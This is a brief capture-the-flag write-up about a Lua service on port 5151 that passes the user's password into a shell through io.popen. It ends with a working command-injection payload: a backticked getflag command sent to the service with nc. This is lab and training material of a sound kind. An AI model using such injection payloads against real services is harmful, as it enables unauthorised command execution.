We have the rights to cat the lua file

we see that it listen on the port 5151 and that with netstat -tuln it is running

we can then connect using nc localhost 5151 and it ask for a password

lets check a little the code

it is using "io.popen("echo "..pass.." | sha1sum", "r")" which is executing an echo command

We can then use this command : "echo '`getflag > /tmp/token`' | nc localhost 5151"
